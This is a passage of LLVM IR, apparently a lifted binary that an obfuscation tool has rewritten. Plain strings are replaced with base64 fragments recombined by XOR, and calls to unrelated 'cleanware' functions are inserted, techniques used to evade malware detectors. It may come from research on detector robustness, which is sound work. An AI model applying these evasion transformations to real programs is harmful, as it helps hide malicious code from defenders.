  %sp123 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.123 = load [1 x i8], [1 x i8]* @str.0.123
  %cipher.ptr.304 = alloca [5 x i8]
  store [5 x i8] c"\52\77\3d\3d\00", [5 x i8]* %cipher.ptr.304
  %cipher.304 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.304, i32 0, i32 0
  %plain.ptr.304 = tail call i8* @base64_decode(i8* %cipher.304)
  %spi304 = bitcast i8* %plain.ptr.304 to [1 x i8]*
  %s0.123 = load [1 x i8], [1 x i8]* %spi304
;-------------------------------
  %sp0.123 = bitcast [2 x i8]* %sp123 to [1 x i8]*
  store [1 x i8] %s0.123, [1 x i8]* %sp0.123
  %next0.123 = getelementptr [2 x i8], [2 x i8]* %sp123, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.123 = load [1 x i8], [1 x i8]* @str.1.123
  %cipher.ptr.305 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.305
  %cipher.305 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.305, i32 0, i32 0
  %plain.ptr.305 = tail call i8* @base64_decode(i8* %cipher.305)
  %spi305 = bitcast i8* %plain.ptr.305 to [1 x i8]*
  %s1.123 = load [1 x i8], [1 x i8]* %spi305
;-------------------------------
  %sp1.123 = bitcast i8* %next0.123 to [1 x i8]*
  store [1 x i8] %s1.123, [1 x i8]* %sp1.123

  %spi123 = load [2 x i8], [2 x i8]* %sp123
  store [2 x i8] %spi123, [2 x i8]* %sp0.71
;-------------------------------
  %sp0.1.71 = bitcast [2 x i8]* %sp0.71 to i16*
  %i0.71 = load i16, i16* %sp0.1.71

  %sp1.71 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\74\6b", [2 x i8]* %sp1.71
  %sp124 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.124 = load [1 x i8], [1 x i8]* @str.0.124
  %cipher.ptr.306 = alloca [5 x i8]
  store [5 x i8] c"\64\41\3d\3d\00", [5 x i8]* %cipher.ptr.306
  %cipher.306 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.306, i32 0, i32 0
  %plain.ptr.306 = tail call i8* @base64_decode(i8* %cipher.306)
  %spi306 = bitcast i8* %plain.ptr.306 to [1 x i8]*
  %s0.124 = load [1 x i8], [1 x i8]* %spi306
;-------------------------------
  %sp0.124 = bitcast [2 x i8]* %sp124 to [1 x i8]*
  store [1 x i8] %s0.124, [1 x i8]* %sp0.124
  %next0.124 = getelementptr [2 x i8], [2 x i8]* %sp124, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.124 = load [1 x i8], [1 x i8]* @str.1.124
  %cipher.ptr.307 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.307
  %cipher.307 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.307, i32 0, i32 0
  %plain.ptr.307 = tail call i8* @base64_decode(i8* %cipher.307)
  %spi307 = bitcast i8* %plain.ptr.307 to [1 x i8]*
  %s1.124 = load [1 x i8], [1 x i8]* %spi307
;-------------------------------
  %sp1.124 = bitcast i8* %next0.124 to [1 x i8]*
  store [1 x i8] %s1.124, [1 x i8]* %sp1.124

  %spi124 = load [2 x i8], [2 x i8]* %sp124
  store [2 x i8] %spi124, [2 x i8]* %sp1.71
;-------------------------------
  %sp1.1.71 = bitcast [2 x i8]* %sp1.71 to i16*
  %i1.71 = load i16, i16* %sp1.1.71

  %xp71 = xor i16 %i0.71, %i1.71

  %fi.71 = alloca i16
  store i16 %xp71, i16* %fi.71

  %spi71 = ptrtoint i16* %fi.71 to i32
  store i32 %spi71, i32* %12, align 4
;-------------------------------
  store i32 %18, i32* %13, align 16
  store i32 134517867, i32* %14, align 4
  %arg.i.i6 = load i32, i32* %13, align 16
  %arg2.i.i7 = load i32, i32* %12, align 4
  %19 = tail call i32 @strcmp(i32 %arg.i.i6, i32 %arg2.i.i7)
  %.not.i.i = icmp eq i32 %19, 0
  br i1 %.not.i.i, label %BB_8049472.i, label %.exit

BB_8049426.i:                                     ; preds = %Func_804941F.exit.i
  store i32 134517803, i32* %7, align 4
  %tmp2_v.i6.i.i = add i32 %tmp0_v.i.i, -40
  %20 = inttoptr i32 %tmp2_v.i6.i.i to i32*
  store i32 %tmp2_v4.i.i, i32* %20, align 8
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i10.i.i = add i32 %tmp0_v.i.i, -68
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @smallest_word_print882 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack881, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %21 = inttoptr i32 %tmp2_v2.i10.i.i to i32*
;-------------------------------
; Replace: store i32 134517414, i32* %21, align 4
  %sp0.72 = alloca [4 x i8]
;-------------------------------
; Replace: store [4 x i8] c"\66\33\1F\43", [4 x i8]* %sp0.72
  %sp125 = alloca [4 x i8]
  
;-------------------------------
; Replace: %s0.125 = load [1 x i8], [1 x i8]* @str.0.125
  %cipher.ptr.310 = alloca [5 x i8]
  store [5 x i8] c"\5a\67\3d\3d\00", [5 x i8]* %cipher.ptr.310
  %cipher.310 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.310, i32 0, i32 0
  %plain.ptr.310 = tail call i8* @base64_decode(i8* %cipher.310)
  %spi310 = bitcast i8* %plain.ptr.310 to [1 x i8]*
  %s0.125 = load [1 x i8], [1 x i8]* %spi310
;-------------------------------
  %sp0.125 = bitcast [4 x i8]* %sp125 to [1 x i8]*
  store [1 x i8] %s0.125, [1 x i8]* %sp0.125
  %next0.125 = getelementptr [4 x i8], [4 x i8]* %sp125, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.125 = load [1 x i8], [1 x i8]* @str.1.125
  %cipher.ptr.308 = alloca [5 x i8]
  store [5 x i8] c"\4d\77\3d\3d\00", [5 x i8]* %cipher.ptr.308
  %cipher.308 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.308, i32 0, i32 0
  %plain.ptr.308 = tail call i8* @base64_decode(i8* %cipher.308)
  %spi308 = bitcast i8* %plain.ptr.308 to [1 x i8]*
  %s1.125 = load [1 x i8], [1 x i8]* %spi308
;-------------------------------
  %sp1.125 = bitcast i8* %next0.125 to [1 x i8]*
  store [1 x i8] %s1.125, [1 x i8]* %sp1.125
  %next1.125 = getelementptr [4 x i8], [4 x i8]* %sp125, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.125 = load [1 x i8], [1 x i8]* @str.2.125
  %cipher.ptr.311 = alloca [5 x i8]
  store [5 x i8] c"\48\77\3d\3d\00", [5 x i8]* %cipher.ptr.311
  %cipher.311 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.311, i32 0, i32 0
  %plain.ptr.311 = tail call i8* @base64_decode(i8* %cipher.311)
  %spi311 = bitcast i8* %plain.ptr.311 to [1 x i8]*
  %s2.125 = load [1 x i8], [1 x i8]* %spi311
;-------------------------------
  %sp2.125 = bitcast i8* %next1.125 to [1 x i8]*
  store [1 x i8] %s2.125, [1 x i8]* %sp2.125
  %next2.125 = getelementptr [4 x i8], [4 x i8]* %sp125, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.125 = load [1 x i8], [1 x i8]* @str.3.125
  %cipher.ptr.309 = alloca [5 x i8]
  store [5 x i8] c"\51\77\3d\3d\00", [5 x i8]* %cipher.ptr.309
  %cipher.309 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.309, i32 0, i32 0
  %plain.ptr.309 = tail call i8* @base64_decode(i8* %cipher.309)
  %spi309 = bitcast i8* %plain.ptr.309 to [1 x i8]*
  %s3.125 = load [1 x i8], [1 x i8]* %spi309
;-------------------------------
  %sp3.125 = bitcast i8* %next2.125 to [1 x i8]*
  store [1 x i8] %s3.125, [1 x i8]* %sp3.125

  %spi125 = load [4 x i8], [4 x i8]* %sp125
  store [4 x i8] %spi125, [4 x i8]* %sp0.72
;-------------------------------
  %sp0.1.72 = bitcast [4 x i8]* %sp0.72 to i32*
  %i0.72 = load i32, i32* %sp0.1.72

  %sp1.72 = alloca [4 x i8]
;-------------------------------
; Replace: store [4 x i8] c"\63\69\32\43", [4 x i8]* %sp1.72
  %sp126 = alloca [4 x i8]
  
;-------------------------------
; Replace: %s0.126 = load [1 x i8], [1 x i8]* @str.0.126
  %cipher.ptr.312 = alloca [5 x i8]
  store [5 x i8] c"\59\77\3d\3d\00", [5 x i8]* %cipher.ptr.312
  %cipher.312 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.312, i32 0, i32 0
  %plain.ptr.312 = tail call i8* @base64_decode(i8* %cipher.312)
  %spi312 = bitcast i8* %plain.ptr.312 to [1 x i8]*
  %s0.126 = load [1 x i8], [1 x i8]* %spi312
;-------------------------------
  %sp0.126 = bitcast [4 x i8]* %sp126 to [1 x i8]*
  store [1 x i8] %s0.126, [1 x i8]* %sp0.126
  %next0.126 = getelementptr [4 x i8], [4 x i8]* %sp126, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.126 = load [1 x i8], [1 x i8]* @str.1.126
  %cipher.ptr.315 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.315
  %cipher.315 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.315, i32 0, i32 0
  %plain.ptr.315 = tail call i8* @base64_decode(i8* %cipher.315)
  %spi315 = bitcast i8* %plain.ptr.315 to [1 x i8]*
  %s1.126 = load [1 x i8], [1 x i8]* %spi315
;-------------------------------
  %sp1.126 = bitcast i8* %next0.126 to [1 x i8]*
  store [1 x i8] %s1.126, [1 x i8]* %sp1.126
  %next1.126 = getelementptr [4 x i8], [4 x i8]* %sp126, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.126 = load [1 x i8], [1 x i8]* @str.2.126
  %cipher.ptr.314 = alloca [5 x i8]
  store [5 x i8] c"\4d\67\3d\3d\00", [5 x i8]* %cipher.ptr.314
  %cipher.314 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.314, i32 0, i32 0
  %plain.ptr.314 = tail call i8* @base64_decode(i8* %cipher.314)
  %spi314 = bitcast i8* %plain.ptr.314 to [1 x i8]*
  %s2.126 = load [1 x i8], [1 x i8]* %spi314
;-------------------------------
  %sp2.126 = bitcast i8* %next1.126 to [1 x i8]*
  store [1 x i8] %s2.126, [1 x i8]* %sp2.126
  %next2.126 = getelementptr [4 x i8], [4 x i8]* %sp126, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.126 = load [1 x i8], [1 x i8]* @str.3.126
  %cipher.ptr.313 = alloca [5 x i8]
  store [5 x i8] c"\51\77\3d\3d\00", [5 x i8]* %cipher.ptr.313
  %cipher.313 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.313, i32 0, i32 0
  %plain.ptr.313 = tail call i8* @base64_decode(i8* %cipher.313)
  %spi313 = bitcast i8* %plain.ptr.313 to [1 x i8]*
  %s3.126 = load [1 x i8], [1 x i8]* %spi313
;-------------------------------
  %sp3.126 = bitcast i8* %next2.126 to [1 x i8]*
  store [1 x i8] %s3.126, [1 x i8]* %sp3.126

  %spi126 = load [4 x i8], [4 x i8]* %sp126
  store [4 x i8] %spi126, [4 x i8]* %sp1.72
;-------------------------------
  %sp1.1.72 = bitcast [4 x i8]* %sp1.72 to i32*
  %i1.72 = load i32, i32* %sp1.1.72

  %xp72 = xor i32 %i0.72, %i1.72

  %fi.72 = alloca i32
  store i32 %xp72, i32* %fi.72

  %spi72 = ptrtoint i32* %fi.72 to i32
  store i32 %spi72, i32* %21, align 4
;-------------------------------
  %tmp2_v1.i.i.i = add i32 %tmp0_v.i.i, -56
  %22 = inttoptr i32 %tmp2_v1.i.i.i to i32*
;-------------------------------
; Replace: store i32 134520840, i32* %22, align 8
  %sp0.73 = alloca [14 x i8]
;-------------------------------
; Replace: store [14 x i8] c"\2D\4F\55\17\69\2D\24\2E\2A\6D\60\76\4B\58", [14 x i8]* %sp0.73
  %sp127 = alloca [14 x i8]
  
;-------------------------------
; Replace: %s0.127 = load [1 x i8], [1 x i8]* @str.0.127
  %cipher.ptr.317 = alloca [5 x i8]
  store [5 x i8] c"\4c\51\3d\3d\00", [5 x i8]* %cipher.ptr.317
  %cipher.317 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.317, i32 0, i32 0
  %plain.ptr.317 = tail call i8* @base64_decode(i8* %cipher.317)
  %spi317 = bitcast i8* %plain.ptr.317 to [1 x i8]*
  %s0.127 = load [1 x i8], [1 x i8]* %spi317
;-------------------------------
  %sp0.127 = bitcast [14 x i8]* %sp127 to [1 x i8]*
  store [1 x i8] %s0.127, [1 x i8]* %sp0.127
  %next0.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.127 = load [2 x i8], [2 x i8]* @str.1.127
  %cipher.ptr.316 = alloca [5 x i8]
  store [5 x i8] c"\54\31\55\3d\00", [5 x i8]* %cipher.ptr.316
  %cipher.316 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.316, i32 0, i32 0
  %plain.ptr.316 = tail call i8* @base64_decode(i8* %cipher.316)
  %spi316 = bitcast i8* %plain.ptr.316 to [2 x i8]*
  %s1.127 = load [2 x i8], [2 x i8]* %spi316
;-------------------------------
  %sp1.127 = bitcast i8* %next0.127 to [2 x i8]*
  store [2 x i8] %s1.127, [2 x i8]* %sp1.127
  %next1.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 3
  
;-------------------------------
; Replace: %s2.127 = load [2 x i8], [2 x i8]* @str.2.127
  %cipher.ptr.321 = alloca [5 x i8]
  store [5 x i8] c"\46\32\6b\3d\00", [5 x i8]* %cipher.ptr.321
  %cipher.321 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.321, i32 0, i32 0
  %plain.ptr.321 = tail call i8* @base64_decode(i8* %cipher.321)
  %spi321 = bitcast i8* %plain.ptr.321 to [2 x i8]*
  %s2.127 = load [2 x i8], [2 x i8]* %spi321
;-------------------------------
  %sp2.127 = bitcast i8* %next1.127 to [2 x i8]*
  store [2 x i8] %s2.127, [2 x i8]* %sp2.127
  %next2.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 5
  
;-------------------------------
; Replace: %s3.127 = load [2 x i8], [2 x i8]* @str.3.127
  %cipher.ptr.322 = alloca [5 x i8]
  store [5 x i8] c"\4c\53\51\3d\00", [5 x i8]* %cipher.ptr.322
  %cipher.322 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.322, i32 0, i32 0
  %plain.ptr.322 = tail call i8* @base64_decode(i8* %cipher.322)
  %spi322 = bitcast i8* %plain.ptr.322 to [2 x i8]*
  %s3.127 = load [2 x i8], [2 x i8]* %spi322
;-------------------------------
  %sp3.127 = bitcast i8* %next2.127 to [2 x i8]*
  store [2 x i8] %s3.127, [2 x i8]* %sp3.127
  %next3.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 7
  
;-------------------------------
; Replace: %s4.127 = load [1 x i8], [1 x i8]* @str.4.127
  %cipher.ptr.323 = alloca [5 x i8]
  store [5 x i8] c"\4c\67\3d\3d\00", [5 x i8]* %cipher.ptr.323
  %cipher.323 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.323, i32 0, i32 0
  %plain.ptr.323 = tail call i8* @base64_decode(i8* %cipher.323)
  %spi323 = bitcast i8* %plain.ptr.323 to [1 x i8]*
  %s4.127 = load [1 x i8], [1 x i8]* %spi323
;-------------------------------
  %sp4.127 = bitcast i8* %next3.127 to [1 x i8]*
  store [1 x i8] %s4.127, [1 x i8]* %sp4.127
  %next4.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 8
  
;-------------------------------
; Replace: %s5.127 = load [2 x i8], [2 x i8]* @str.5.127
  %cipher.ptr.320 = alloca [5 x i8]
  store [5 x i8] c"\4b\6d\30\3d\00", [5 x i8]* %cipher.ptr.320
  %cipher.320 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.320, i32 0, i32 0
  %plain.ptr.320 = tail call i8* @base64_decode(i8* %cipher.320)
  %spi320 = bitcast i8* %plain.ptr.320 to [2 x i8]*
  %s5.127 = load [2 x i8], [2 x i8]* %spi320
;-------------------------------
  %sp5.127 = bitcast i8* %next4.127 to [2 x i8]*
  store [2 x i8] %s5.127, [2 x i8]* %sp5.127
  %next5.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 10
  
;-------------------------------
; Replace: %s6.127 = load [2 x i8], [2 x i8]* @str.6.127
  %cipher.ptr.319 = alloca [5 x i8]
  store [5 x i8] c"\59\48\59\3d\00", [5 x i8]* %cipher.ptr.319
  %cipher.319 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.319, i32 0, i32 0
  %plain.ptr.319 = tail call i8* @base64_decode(i8* %cipher.319)
  %spi319 = bitcast i8* %plain.ptr.319 to [2 x i8]*
  %s6.127 = load [2 x i8], [2 x i8]* %spi319
;-------------------------------
  %sp6.127 = bitcast i8* %next5.127 to [2 x i8]*
  store [2 x i8] %s6.127, [2 x i8]* %sp6.127
  %next6.127 = getelementptr [14 x i8], [14 x i8]* %sp127, i32 0, i32 12
  
;-------------------------------
; Replace: %s7.127 = load [2 x i8], [2 x i8]* @str.7.127
  %cipher.ptr.318 = alloca [5 x i8]
  store [5 x i8] c"\53\31\67\3d\00", [5 x i8]* %cipher.ptr.318
  %cipher.318 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.318, i32 0, i32 0
  %plain.ptr.318 = tail call i8* @base64_decode(i8* %cipher.318)
  %spi318 = bitcast i8* %plain.ptr.318 to [2 x i8]*
  %s7.127 = load [2 x i8], [2 x i8]* %spi318
;-------------------------------
  %sp7.127 = bitcast i8* %next6.127 to [2 x i8]*
  store [2 x i8] %s7.127, [2 x i8]* %sp7.127

  %spi127 = load [14 x i8], [14 x i8]* %sp127
  store [14 x i8] %spi127, [14 x i8]* %sp0.73
;-------------------------------
  %sp0.1.73 = bitcast [14 x i8]* %sp0.73 to i112*
  %i0.73 = load i112, i112* %sp0.1.73

  %sp1.73 = alloca [14 x i8]
;-------------------------------
; Replace: store [14 x i8] c"\64\6f\34\7a\49\48\52\47\46\4c\41\57\41\58", [14 x i8]* %sp1.73
  %sp128 = alloca [14 x i8]
  
;-------------------------------
; Replace: %s0.128 = load [1 x i8], [1 x i8]* @str.0.128
  %cipher.ptr.328 = alloca [5 x i8]
  store [5 x i8] c"\5a\41\3d\3d\00", [5 x i8]* %cipher.ptr.328
  %cipher.328 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.328, i32 0, i32 0
  %plain.ptr.328 = tail call i8* @base64_decode(i8* %cipher.328)
  %spi328 = bitcast i8* %plain.ptr.328 to [1 x i8]*
  %s0.128 = load [1 x i8], [1 x i8]* %spi328
;-------------------------------
  %sp0.128 = bitcast [14 x i8]* %sp128 to [1 x i8]*
  store [1 x i8] %s0.128, [1 x i8]* %sp0.128
  %next0.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.128 = load [2 x i8], [2 x i8]* @str.1.128
  %cipher.ptr.325 = alloca [5 x i8]
  store [5 x i8] c"\62\7a\51\3d\00", [5 x i8]* %cipher.ptr.325
  %cipher.325 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.325, i32 0, i32 0
  %plain.ptr.325 = tail call i8* @base64_decode(i8* %cipher.325)
  %spi325 = bitcast i8* %plain.ptr.325 to [2 x i8]*
  %s1.128 = load [2 x i8], [2 x i8]* %spi325
;-------------------------------
  %sp1.128 = bitcast i8* %next0.128 to [2 x i8]*
  store [2 x i8] %s1.128, [2 x i8]* %sp1.128
  %next1.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 3
  
;-------------------------------
; Replace: %s2.128 = load [2 x i8], [2 x i8]* @str.2.128
  %cipher.ptr.330 = alloca [5 x i8]
  store [5 x i8] c"\65\6b\6b\3d\00", [5 x i8]* %cipher.ptr.330
  %cipher.330 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.330, i32 0, i32 0
  %plain.ptr.330 = tail call i8* @base64_decode(i8* %cipher.330)
  %spi330 = bitcast i8* %plain.ptr.330 to [2 x i8]*
  %s2.128 = load [2 x i8], [2 x i8]* %spi330
;-------------------------------
  %sp2.128 = bitcast i8* %next1.128 to [2 x i8]*
  store [2 x i8] %s2.128, [2 x i8]* %sp2.128
  %next2.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 5
  
;-------------------------------
; Replace: %s3.128 = load [2 x i8], [2 x i8]* @str.3.128
  %cipher.ptr.329 = alloca [5 x i8]
  store [5 x i8] c"\53\46\49\3d\00", [5 x i8]* %cipher.ptr.329
  %cipher.329 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.329, i32 0, i32 0
  %plain.ptr.329 = tail call i8* @base64_decode(i8* %cipher.329)
  %spi329 = bitcast i8* %plain.ptr.329 to [2 x i8]*
  %s3.128 = load [2 x i8], [2 x i8]* %spi329
;-------------------------------
  %sp3.128 = bitcast i8* %next2.128 to [2 x i8]*
  store [2 x i8] %s3.128, [2 x i8]* %sp3.128
  %next3.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 7
  
;-------------------------------
; Replace: %s4.128 = load [1 x i8], [1 x i8]* @str.4.128
  %cipher.ptr.331 = alloca [5 x i8]
  store [5 x i8] c"\52\77\3d\3d\00", [5 x i8]* %cipher.ptr.331
  %cipher.331 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.331, i32 0, i32 0
  %plain.ptr.331 = tail call i8* @base64_decode(i8* %cipher.331)
  %spi331 = bitcast i8* %plain.ptr.331 to [1 x i8]*
  %s4.128 = load [1 x i8], [1 x i8]* %spi331
;-------------------------------
  %sp4.128 = bitcast i8* %next3.128 to [1 x i8]*
  store [1 x i8] %s4.128, [1 x i8]* %sp4.128
  %next4.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 8
  
;-------------------------------
; Replace: %s5.128 = load [2 x i8], [2 x i8]* @str.5.128
  %cipher.ptr.327 = alloca [5 x i8]
  store [5 x i8] c"\52\6b\77\3d\00", [5 x i8]* %cipher.ptr.327
  %cipher.327 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.327, i32 0, i32 0
  %plain.ptr.327 = tail call i8* @base64_decode(i8* %cipher.327)
  %spi327 = bitcast i8* %plain.ptr.327 to [2 x i8]*
  %s5.128 = load [2 x i8], [2 x i8]* %spi327
;-------------------------------
  %sp5.128 = bitcast i8* %next4.128 to [2 x i8]*
  store [2 x i8] %s5.128, [2 x i8]* %sp5.128
  %next5.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 10
  
;-------------------------------
; Replace: %s6.128 = load [2 x i8], [2 x i8]* @str.6.128
  %cipher.ptr.324 = alloca [5 x i8]
  store [5 x i8] c"\51\56\63\3d\00", [5 x i8]* %cipher.ptr.324
  %cipher.324 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.324, i32 0, i32 0
  %plain.ptr.324 = tail call i8* @base64_decode(i8* %cipher.324)
  %spi324 = bitcast i8* %plain.ptr.324 to [2 x i8]*
  %s6.128 = load [2 x i8], [2 x i8]* %spi324
;-------------------------------
  %sp6.128 = bitcast i8* %next5.128 to [2 x i8]*
  store [2 x i8] %s6.128, [2 x i8]* %sp6.128
  %next6.128 = getelementptr [14 x i8], [14 x i8]* %sp128, i32 0, i32 12
  
;-------------------------------
; Replace: %s7.128 = load [2 x i8], [2 x i8]* @str.7.128
  %cipher.ptr.326 = alloca [5 x i8]
  store [5 x i8] c"\51\56\67\3d\00", [5 x i8]* %cipher.ptr.326
  %cipher.326 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.326, i32 0, i32 0
  %plain.ptr.326 = tail call i8* @base64_decode(i8* %cipher.326)
  %spi326 = bitcast i8* %plain.ptr.326 to [2 x i8]*
  %s7.128 = load [2 x i8], [2 x i8]* %spi326
;-------------------------------
  %sp7.128 = bitcast i8* %next6.128 to [2 x i8]*
  store [2 x i8] %s7.128, [2 x i8]* %sp7.128

  %spi128 = load [14 x i8], [14 x i8]* %sp128
  store [14 x i8] %spi128, [14 x i8]* %sp1.73
;-------------------------------
  %sp1.1.73 = bitcast [14 x i8]* %sp1.73 to i112*
  %i1.73 = load i112, i112* %sp1.1.73

  %xp73 = xor i112 %i0.73, %i1.73

  %fi.73 = alloca i112
  store i112 %xp73, i112* %fi.73

  %spi73 = ptrtoint i112* %fi.73 to i32
  store i32 %spi73, i32* %22, align 8
;-------------------------------
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @print_0_99_grid231 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack230, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
;-------------------------------
; Replace: store i32 134520854, i32* %14, align 4
  %sp0.74 = alloca [9 x i8]
;-------------------------------
; Replace: store [9 x i8] c"\27\3C\12\69\1A\4C\5D\44\37", [9 x i8]* %sp0.74
  %sp129 = alloca [9 x i8]
  
;-------------------------------
; Replace: %s0.129 = load [1 x i8], [1 x i8]* @str.0.129
  %cipher.ptr.337 = alloca [5 x i8]
  store [5 x i8] c"\4a\77\3d\3d\00", [5 x i8]* %cipher.ptr.337
  %cipher.337 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.337, i32 0, i32 0
  %plain.ptr.337 = tail call i8* @base64_decode(i8* %cipher.337)
  %spi337 = bitcast i8* %plain.ptr.337 to [1 x i8]*
  %s0.129 = load [1 x i8], [1 x i8]* %spi337
;-------------------------------
  %sp0.129 = bitcast [9 x i8]* %sp129 to [1 x i8]*
  store [1 x i8] %s0.129, [1 x i8]* %sp0.129
  %next0.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.129 = load [1 x i8], [1 x i8]* @str.1.129
  %cipher.ptr.339 = alloca [5 x i8]
  store [5 x i8] c"\50\41\3d\3d\00", [5 x i8]* %cipher.ptr.339
  %cipher.339 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.339, i32 0, i32 0
  %plain.ptr.339 = tail call i8* @base64_decode(i8* %cipher.339)
  %spi339 = bitcast i8* %plain.ptr.339 to [1 x i8]*
  %s1.129 = load [1 x i8], [1 x i8]* %spi339
;-------------------------------
  %sp1.129 = bitcast i8* %next0.129 to [1 x i8]*
  store [1 x i8] %s1.129, [1 x i8]* %sp1.129
  %next1.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.129 = load [1 x i8], [1 x i8]* @str.2.129
  %cipher.ptr.334 = alloca [5 x i8]
  store [5 x i8] c"\45\67\3d\3d\00", [5 x i8]* %cipher.ptr.334
  %cipher.334 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.334, i32 0, i32 0
  %plain.ptr.334 = tail call i8* @base64_decode(i8* %cipher.334)
  %spi334 = bitcast i8* %plain.ptr.334 to [1 x i8]*
  %s2.129 = load [1 x i8], [1 x i8]* %spi334
;-------------------------------
  %sp2.129 = bitcast i8* %next1.129 to [1 x i8]*
  store [1 x i8] %s2.129, [1 x i8]* %sp2.129
  %next2.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.129 = load [1 x i8], [1 x i8]* @str.3.129
  %cipher.ptr.336 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.336
  %cipher.336 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.336, i32 0, i32 0
  %plain.ptr.336 = tail call i8* @base64_decode(i8* %cipher.336)
  %spi336 = bitcast i8* %plain.ptr.336 to [1 x i8]*
  %s3.129 = load [1 x i8], [1 x i8]* %spi336
;-------------------------------
  %sp3.129 = bitcast i8* %next2.129 to [1 x i8]*
  store [1 x i8] %s3.129, [1 x i8]* %sp3.129
  %next3.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 4
  
;-------------------------------
; Replace: %s4.129 = load [1 x i8], [1 x i8]* @str.4.129
  %cipher.ptr.335 = alloca [5 x i8]
  store [5 x i8] c"\47\67\3d\3d\00", [5 x i8]* %cipher.ptr.335
  %cipher.335 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.335, i32 0, i32 0
  %plain.ptr.335 = tail call i8* @base64_decode(i8* %cipher.335)
  %spi335 = bitcast i8* %plain.ptr.335 to [1 x i8]*
  %s4.129 = load [1 x i8], [1 x i8]* %spi335
;-------------------------------
  %sp4.129 = bitcast i8* %next3.129 to [1 x i8]*
  store [1 x i8] %s4.129, [1 x i8]* %sp4.129
  %next4.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 5
  
;-------------------------------
; Replace: %s5.129 = load [1 x i8], [1 x i8]* @str.5.129
  %cipher.ptr.333 = alloca [5 x i8]
  store [5 x i8] c"\54\41\3d\3d\00", [5 x i8]* %cipher.ptr.333
  %cipher.333 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.333, i32 0, i32 0
  %plain.ptr.333 = tail call i8* @base64_decode(i8* %cipher.333)
  %spi333 = bitcast i8* %plain.ptr.333 to [1 x i8]*
  %s5.129 = load [1 x i8], [1 x i8]* %spi333
;-------------------------------
